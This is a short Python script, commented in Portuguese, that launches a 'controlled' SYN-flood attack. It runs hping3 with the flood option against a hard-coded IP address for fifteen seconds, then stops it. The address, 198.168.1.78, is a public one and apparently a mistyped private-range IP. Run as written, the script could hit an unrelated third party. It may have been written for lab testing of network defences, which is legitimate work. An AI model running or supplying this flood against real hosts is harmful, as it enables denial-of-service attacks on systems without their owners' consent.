import subprocess
import time
import os

def disparar_ataque_controlado(segundos=15):
    comando = ["sudo", "hping3", "-S", "--flood" , "198.168.1.78"] #Ip da maquina alvo
    
    print(f"🚀 Iniciando ataque por {segundos} segundos...")
    
    processo = subprocess.Popen(comando, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    time.sleep(segundos)
    
    print("🛑 Tempo esgotado! Parando o ataque...")
    processo.terminate() 
    
    processo.wait() 
    print("✅ Ataque finalizado com sucesso.")

if __name__ == "__main__":
    disparar_ataque_controlado()